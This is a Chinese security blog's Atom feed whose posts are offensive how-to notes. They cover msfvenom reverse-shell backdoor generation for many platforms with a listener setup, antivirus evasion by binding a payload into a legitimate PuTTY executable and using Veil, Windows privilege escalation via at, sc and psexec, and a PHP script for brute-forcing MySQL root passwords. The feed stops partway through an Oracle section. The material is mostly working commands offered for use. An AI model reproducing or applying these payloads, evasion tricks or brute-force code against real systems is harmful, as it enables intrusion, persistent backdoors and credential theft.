<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2021-07-27T07:25:13.374Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GTFObins</title>
    <link href="http://bai-ren-1.github.io/2021/07/27/GTFObins/"/>
    <id>http://bai-ren-1.github.io/2021/07/27/GTFObins/</id>
    <published>2021-07-27T07:18:52.000Z</published>
    <updated>2021-07-27T07:25:13.374Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GTFObins"><a href="#GTFObins" class="headerlink" title="GTFObins"></a>GTFObins</h1><p>好东西记录一下。</p><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>网址链接：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p><p>“GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.The project collects legitimate <a href="https://gtfobins.github.io/functions/" target="_blank" rel="noopener">functions</a> of Unix binaries that can be abused to <del>get the f**k</del> break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.It is important to note that this is <strong>not</strong> a list of exploits, and the programs listed here are not vulnerable per se, rather, GTFOBins is a compendium about how to live off the land when you only have certain binaries available.GTFOBins is a <a href="https://github.com/GTFOBins/GTFOBins.github.io/graphs/contributors" target="_blank" rel="noopener">collaborative</a> project created by <a href="https://twitter.com/norbemi" target="_blank" rel="noopener">Emilio Pinna</a> and <a href="https://twitter.com/cyrus_and" target="_blank" rel="noopener">Andrea Cardaci</a> where everyone can <a href="https://gtfobins.github.io/contribute/" target="_blank" rel="noopener">contribute</a> with additional binaries and techniques.If you are looking for Windows binaries you should visit <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a>.”</p><p>直接贴谷歌翻译的概要：GTFOBins是一个精心策划的Unix二进制文件列表，可用于绕过配置错误的系统中的本地安全限制。该项目收集Unix具有合法功能的二进制文件，这些二进制文件可以被Hack，以获得受限的shell、升级或维护提升的特权、传输文件、生成绑定和反向shell。个人理解其实就是教你怎么利用合法软件提权</p><h2 id="0x01-利用"><a href="#0x01-利用" class="headerlink" title="0x01 利用"></a>0x01 利用</h2><ul><li>sudo -l 看进程</li><li>GTFObins 找对应利用</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;GTFObins&quot;&gt;&lt;a href=&quot;#GTFObins&quot; class=&quot;headerlink&quot; title=&quot;GTFObins&quot;&gt;&lt;/a&gt;GTFObins&lt;/h1&gt;&lt;p&gt;好东西记录一下。&lt;/p&gt;
&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Searchsploit</title>
    <link href="http://bai-ren-1.github.io/2021/07/27/Searchsploit/"/>
    <id>http://bai-ren-1.github.io/2021/07/27/Searchsploit/</id>
    <published>2021-07-27T06:59:31.000Z</published>
    <updated>2021-07-27T07:06:52.782Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h1><p>记录好东西。</p><h2 id="0x00-Exploit-db"><a href="#0x00-Exploit-db" class="headerlink" title="0x00 Exploit-db"></a>0x00 Exploit-db</h2><p>Exploit-db是Kali linux 官方团队维护的一个安全项目，存储了大量的漏洞利用程序，是公认的世界上最大的搜集漏洞的数据库。它的在线版本是<a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a>  ，离线版本是：<a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a> 。</p><p>而searchsploit可以利用exploit-db提供的数据库进行离线搜索，加上参数又可以到exploit-db.com上进行在线搜索。可以帮助安全研究者和渗透测试工程师更好的进行安全测试工作。Kali Linux或者其他的渗透测试系统默认安装了searchsploit,因此本文不再讲其安装过程。使用方法是使用终端，键入其语法。 </p><h2 id="0x01-参数"><a href="#0x01-参数" class="headerlink" title="0x01 参数"></a>0x01 参数</h2><p>-c, –case[Term]执行区分大小写的搜索，缺省是对大小写不敏感。</p><p>-e, –exact [Term]对exploit标题执行EXACT匹配（默认为AND）</p><p>-h, –help在屏幕上显示帮助</p><p>-j, –json[Term]以JSON格式显示结果</p><p>-m, –mirror [EDB-ID]将一个漏洞利用镜像（副本）到当前工作目录，后面跟漏洞ID号</p><p>-o, –overflow [Term]Exploit标题被允许溢出其列</p><p>-p, –path[EDB-ID]显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号</p><p>-t, –title[Term]仅仅搜索漏洞标题（默认是标题和文件的路径）</p><p>-u, –update检查并安装任何exploitdb软件包更新（deb或git）</p><p>-w, –www [Term]显示Exploit-DB.com的URL而不是本地路径（在线搜索）</p><p>-x, –examine[EDB-ID]使用$ PAGER检查（副本）漏洞利用</p><p>-v –verbose 显示更多的输出信息</p><p>–colour在搜索结果中禁用颜色突出显示.</p><p>–id显示EDB-ID值而不是本地路径</p><p>–nmap[file.xml]使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）</p><h2 id="0x02-实例"><a href="#0x02-实例" class="headerlink" title="0x02 实例"></a>0x02 实例</h2><ul><li>searchsploit phpcms 查找phpcms的exp</li><li>searchsploit -p 29349 查看29349编号的exp所在路径等</li><li>通过cat查看利用方式或者通过路径将exp的内容cp出来利用</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Searchsploit&quot;&gt;&lt;a href=&quot;#Searchsploit&quot; class=&quot;headerlink&quot; title=&quot;Searchsploit&quot;&gt;&lt;/a&gt;Searchsploit&lt;/h1&gt;&lt;p&gt;记录好东西。&lt;/p&gt;
&lt;h2 id=&quot;0x00-Exploi
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>MSF后门</title>
    <link href="http://bai-ren-1.github.io/2021/07/19/MSF%E5%90%8E%E9%97%A8/"/>
    <id>http://bai-ren-1.github.io/2021/07/19/MSF%E5%90%8E%E9%97%A8/</id>
    <published>2021-07-19T03:41:14.000Z</published>
    <updated>2021-07-19T04:22:08.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MSF后门"><a href="#MSF后门" class="headerlink" title="MSF后门"></a>MSF后门</h1><p>简单的记录一下。</p><h2 id="0x00-MSFVenom参数"><a href="#0x00-MSFVenom参数" class="headerlink" title="0x00 MSFVenom参数"></a>0x00 MSFVenom参数</h2><p>MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下： </p><table><thead><tr><th>MSFVenom参数说明</th></tr></thead><tbody><tr><td>e 编码方式</td></tr><tr><td>i 编码次数</td></tr><tr><td>b 在生成的程序中避免出现的值</td></tr><tr><td>f 输出格式</td></tr><tr><td>p 选择payload</td></tr><tr><td>l 查看所有payload</td></tr><tr><td>a 选择架构平台(x86|x64|x86_64)</td></tr><tr><td>o 文件输出</td></tr><tr><td>c 添加自己的shellcode</td></tr><tr><td>x|k 捆绑</td></tr></tbody></table><h2 id="0x01-后门生成"><a href="#0x01-后门生成" class="headerlink" title="0x01 后门生成"></a>0x01 后门生成</h2><p>Windows</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b 'x00x0axff' -i <span class="number">3</span> -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf</span><br></pre></td></tr></table></figure><p>Mac</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho</span><br></pre></td></tr></table></figure><p> powershell（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=</span><br><span class="line">攻击机IP LPORT=攻击机端口 -e <span class="built_in">cmd</span>/powershell_base64 -i <span class="number">3</span> -f raw -o payload.ps1</span><br></pre></td></tr></table></figure><p>php（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> '&lt;?php ' | tr -d 'n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt;</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure><p>aspx（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=</span><br><span class="line">攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx</span><br></pre></td></tr></table></figure><p>jsp（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.jsp</span><br></pre></td></tr></table></figure><p>war（反弹shell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -</span><br><span class="line">o payload.war</span><br></pre></td></tr></table></figure><p>nodejs（反弹shell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o</span><br><span class="line">payload.js</span><br></pre></td></tr></table></figure><p>python（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -</span><br><span class="line">f raw -o payload.py</span><br></pre></td></tr></table></figure><p>perl（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o</span><br><span class="line">payload.pl</span><br></pre></td></tr></table></figure><p>ruby（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o</span><br><span class="line">payload.rb</span><br></pre></td></tr></table></figure><p>lua（反弹shell）</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o</span><br><span class="line">payload.lua</span><br></pre></td></tr></table></figure><p>windows shellcode</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=</span><br><span class="line">攻击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure><p>linux shellcode</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻</span><br><span class="line">击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure><p>mac shellcode</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP</span><br><span class="line">LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure><h2 id="0x02-监听端口"><a href="#0x02-监听端口" class="headerlink" title="0x02 监听端口"></a>0x02 监听端口</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD php/meterpreter/reverse_tcp（如果是windows就把php换成windows，以此类推）</span><br><span class="line"><span class="built_in">set</span> LHOST 攻击机IP</span><br><span class="line"><span class="built_in">set</span> LPORT 攻击机端口</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="0x03-免杀"><a href="#0x03-免杀" class="headerlink" title="0x03 免杀"></a>0x03 免杀</h2><h3 id="00-自捆绑-编码免杀"><a href="#00-自捆绑-编码免杀" class="headerlink" title="00 自捆绑+编码免杀"></a>00 自捆绑+编码免杀</h3><p>使用msfvenom生成木马的时候使用<strong>-x捆绑一个正常的软件</strong>，类似于生成图片马，将恶意攻击payload镶进软件内。然后再对木马进行编码，命令如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=<span class="number">172</span>.<span class="number">16</span>.<span class="number">143</span>.<span class="number">135</span> LPORT=<span class="number">4444</span> -e x86/shikata_ga_nai -x puttyel.exe -i <span class="number">15</span> - f exe -o fake_puttyel.exe</span><br></pre></td></tr></table></figure><blockquote><p>msfvenom –list encoders：查看msfvenom自带的编码器，可以看到x86/shikata_ga_nai编码器是评级为x86里面唯一excellent的，所以也是编码中使用最多的；-e, –encoder [encoder] 指定需要使用的encoder(编码器),指定需要使用的编码 ；-i，指定编码次数。</p></blockquote><p> 能过360纯静态查杀，但时隔1分钟左右会被行为检测、动态检测查杀。所以<strong>上线以后及时做进程迁移</strong>。 </p><h3 id="01-veil-mingw-w64"><a href="#01-veil-mingw-w64" class="headerlink" title="01 veil+mingw-w64"></a>01 veil+mingw-w64</h3><p>veil是一个专门拿来做免杀的渗透框架。veil有两个<strong>免杀模块，Evasion和Ordnance</strong>，我们多用Evasion来做文件免杀。 veil使用docker镜像安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://hub.docker.com/r/mattiasohlsson/veil/</span><br><span class="line">docker pull mattiasohlsson/veil</span><br><span class="line">docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure><p>用<strong>veil生成shellcode然后使用mibgw-264（windows下的gcc) 去加载</strong>。veil生成shellcode：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use <span class="number">1</span>（选择Evasion模块)</span><br><span class="line">use <span class="number">7</span> (选择payload)</span><br><span class="line"><span class="built_in">set</span> LHOST 攻击机IP</span><br><span class="line"><span class="built_in">set</span> LPORT 攻击机端口</span><br><span class="line">gengrate</span><br></pre></td></tr></table></figure><p>安装好mibgw-264进行编译即可，生成msf66.exe。百度<strong>找到mibgw-264这个安装包，然后在其bin目录下找到gcc.exe即可使用</strong>。生成的exe即是免杀后门，双击执行，msf可成功上线，然后进行迁移进程即可。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MSF后门&quot;&gt;&lt;a href=&quot;#MSF后门&quot; class=&quot;headerlink&quot; title=&quot;MSF后门&quot;&gt;&lt;/a&gt;MSF后门&lt;/h1&gt;&lt;p&gt;简单的记录一下。&lt;/p&gt;
&lt;h2 id=&quot;0x00-MSFVenom参数&quot;&gt;&lt;a href=&quot;#0x00-MSFVe
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Nmap使用</title>
    <link href="http://bai-ren-1.github.io/2021/07/16/Nmap%E4%BD%BF%E7%94%A8/"/>
    <id>http://bai-ren-1.github.io/2021/07/16/Nmap%E4%BD%BF%E7%94%A8/</id>
    <published>2021-07-16T05:36:35.000Z</published>
    <updated>2021-07-16T05:37:10.945Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nmap使用"><a href="#Nmap使用" class="headerlink" title="Nmap使用"></a>Nmap使用</h1><p><a href="https://mp.weixin.qq.com/s/Z3tAOIvWnD9krbUohcO-Bw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Z3tAOIvWnD9krbUohcO-Bw</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nmap使用&quot;&gt;&lt;a href=&quot;#Nmap使用&quot; class=&quot;headerlink&quot; title=&quot;Nmap使用&quot;&gt;&lt;/a&gt;Nmap使用&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/Z3tAOIvWnD9krbUohc
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>提权总结</title>
    <link href="http://bai-ren-1.github.io/2021/07/13/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
    <id>http://bai-ren-1.github.io/2021/07/13/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</id>
    <published>2021-07-13T03:22:45.000Z</published>
    <updated>2021-07-13T04:14:53.073Z</updated>
    
    <content type="html"><![CDATA[<h1 id="提权总结"><a href="#提权总结" class="headerlink" title="提权总结"></a>提权总结</h1><p>转载自：<a href="https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&amp;mid=2247490498&amp;idx=1&amp;sn=891507a7354e2991da33f09bce8a4346&amp;chksm=eafa538edd8dda9817273c22e8714fd1740876bbabf62ed04a0adab72522c01e3439e762e8c9&amp;scene=132#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&amp;mid=2247490498&amp;idx=1&amp;sn=891507a7354e2991da33f09bce8a4346&amp;chksm=eafa538edd8dda9817273c22e8714fd1740876bbabf62ed04a0adab72522c01e3439e762e8c9&amp;scene=132#wechat_redirect</a></p><h2 id="0x00-权限"><a href="#0x00-权限" class="headerlink" title="0x00 权限"></a>0x00 权限</h2><ul><li><strong>system账户</strong></li></ul><p>Windows系统最高级别的权限是System用户权限，有一些操作需要System权限才能完成，比如修改注册表核心键值、强制结束恶意应用程序进程等。</p><ul><li><strong>管理员账户</strong></li></ul><p>具有最高的管理和使用权限，能改变系统所有设置，可以安装和删除程序，能访问计算机上所有的文件。除此之外，它还拥有控制其他用户的权限。</p><ul><li><strong>普通用户账户</strong></li></ul><p>某些功能的使用，是受到一定限制的账户，在系统中可以创建多个此类账户，也可以改变其账户类型。该账户可以访问已经安装在计算机上的程序，可以设置自己账户的图片、密码等，但无权更改大多数计算机的设置。 </p><h2 id="0x01-Web提权"><a href="#0x01-Web提权" class="headerlink" title="0x01 Web提权"></a>0x01 Web提权</h2><ul><li><strong>上传后门文件</strong>，获取到webshell权限。 </li><li>在web权限提升中，最常用的是溢出漏洞提权，<strong>用cmd去执行文件</strong>进行提权，从下图可以清晰的看到我们在webshell看到的权限和服务器上看到的权限是不一样的。 </li></ul><p><img src="/2021/07/13/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/1.png" alt></p><ul><li><p>利用<strong>systeminfo进行信息收集</strong>，一般关注操作系统版本，打过的补丁编号。 </p></li><li><p>获取到补丁编号后，我们要<strong>进行补丁筛选</strong>，推荐两个优秀项目：wesng , windowsVulnScan。将上面收集到的信息保存到1.txt中，利用wesng进行补丁筛选。</p><ul><li><a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">https://github.com/bitsadmin/wesng</a></li><li><a href="https://github.com/chroblert/WindowsVulnScan" target="_blank" rel="noopener">https://github.com/chroblert/WindowsVulnScan</a> </li></ul></li><li><p>执行完后会将可能存在的漏洞保存在vuln.csv中。</p></li><li><p>利用MSF或特定EXP进行提权（msf要搭建在外网，才能将会话反弹到本机，内网不能反弹）生成一个5577.exe后门，webshell执行该后门，反弹的端口号为5577。</p></li><li><p>端口反弹的权限为<strong>web权限</strong>。</p><p><img src="/2021/07/13/%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2.png" alt></p></li><li><p>利用<strong>wesng中收集到的漏洞编号，进行模块利用</strong>，并且设置反弹端口，此时的端口号应该与前面的不同，这个端口反弹的权限为提权后的权限，并且监听的会话与上面的会话对应。</p></li><li><p>成功反弹<strong>system权限</strong>。</p></li></ul><blockquote><p>其实就是上传Webshell后信息收集补丁信息，然后抄EXP去打罢了。</p></blockquote><h2 id="0x02-本地提权"><a href="#0x02-本地提权" class="headerlink" title="0x02 本地提权"></a>0x02 本地提权</h2><p>获取本地普通用户的权限后，要将权限提升为更高权限，本地提权的成功概率比web提权更高。 </p><ul><li><strong>系统溢出漏洞提权</strong> </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接网上下载BitsArbitraryFileMoveExploit.exe,运行就可以提升为系统权限；</span><br></pre></td></tr></table></figure><ul><li><strong>AT命令提权</strong> </li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> <span class="number">13</span>:<span class="number">36</span> /interactive <span class="built_in">cmd</span>.exe (在<span class="number">13</span>：<span class="number">36</span>分生成一个交互式的System权限的<span class="built_in">cmd</span>)</span><br><span class="line">使用版本：Win2000 &amp; Win2003 &amp; XP</span><br></pre></td></tr></table></figure><ul><li><strong>SC命令提权</strong> </li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= “<span class="built_in">cmd</span> /K <span class="built_in">start</span>” <span class="built_in">type</span>= own <span class="built_in">type</span>= interact #创建一个名叫syscmd的新的交互式的<span class="built_in">cmd</span>服务</span><br><span class="line">sc <span class="built_in">start</span> syscmd #得到了system权限的<span class="built_in">cmd</span>环境</span><br><span class="line">适用版本：windows <span class="number">7</span>、<span class="number">8</span>、<span class="number">03</span>、<span class="number">08</span></span><br></pre></td></tr></table></figure><ul><li><strong>PS命令提权</strong> </li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">微软工具包：https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</span><br><span class="line">psexec.exe -accepteula -s -i -d <span class="built_in">cmd</span>.exe</span><br><span class="line">适用版本：Win2003 &amp; Win2008</span><br></pre></td></tr></table></figure><h2 id="0x03-数据库提权"><a href="#0x03-数据库提权" class="headerlink" title="0x03 数据库提权"></a>0x03 数据库提权</h2><ul><li><p><strong>Mysql数据库提权</strong> </p><p><strong>UDF提权</strong></p><p>在利用<strong>UDF提权时前提是我们需要知道数据库的密码</strong>，而在正常情况下MySQL数据库不支持外连，此时如果我们用工具爆破不了，可以上传脚本进行爆破，脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Mysql账号密码爆破工具&lt;/title&gt;</span><br><span class="line">  &lt;m eta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;center&gt;</span><br><span class="line">   &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;h1&gt;MysqlDatab aseBlasting(Mysql账号密码在线爆破工具 V1.0)&lt;/h1&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"> if(@$_POST[&apos;submit&apos;])&#123;</span><br><span class="line">   $host = @$_POST[&apos;host&apos;];</span><br><span class="line">   if($host!=&quot;&quot;)&#123;</span><br><span class="line">    $username = &quot;root&quot;;//用户名字典</span><br><span class="line">    $password = array(&apos;&apos;,&apos;123456&apos;,&apos;admin&apos;,&apos;root123&apos;,&apos;ccf304vn&apos;); //密码字典</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;hr&gt;&lt;br&gt;--------------------爆破状态--------------------&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;密码错误次数：&quot;;</span><br><span class="line">    for ($i=0; $i &lt;= count($password); $i++) &#123;</span><br><span class="line">     if(@mysql_connect($host, $username, $password[$i]))&#123;</span><br><span class="line">       echo &quot;&lt;br&gt;&lt;br&gt;&lt;font color=&apos;red&apos;&gt;爆破成功--密码--&gt;&quot;.@$password[$i].&quot;&lt;/font&gt;&quot;;</span><br><span class="line">       break;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">       echo $i.&quot;、&quot;;</span><br><span class="line">       continue;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br&gt;--------------------爆破结束--------------------&lt;br&gt;&lt;hr&gt;&quot;;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;黑客，输入数据库IP地址&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">  &lt;form action=&quot;MysqlDatab aseBlasting.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">   数据库IP地址:&lt;input type=&quot;text&quot; name=&quot;host&quot;/&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;爆破&quot; name=&quot;submit&quot;/&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>参考： <a href="https://blog.csdn.net/qq_36119192/article/details/84863268" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84863268</a> </p></li><li><p><strong>Mssql数据库提权</strong> </p><p>参考： <a href="https://www.cnblogs.com/N0r4h/p/12889944.html" target="_blank" rel="noopener">https://www.cnblogs.com/N0r4h/p/12889944.html</a> </p></li><li><p><strong>Oracle数据库提权</strong> </p><ul><li><strong>普通用户模式</strong>：前提是拥有一个普通的Oracle连接账号，不需要DBA，并以Oracle实例运行的权限执行操作系统命令。 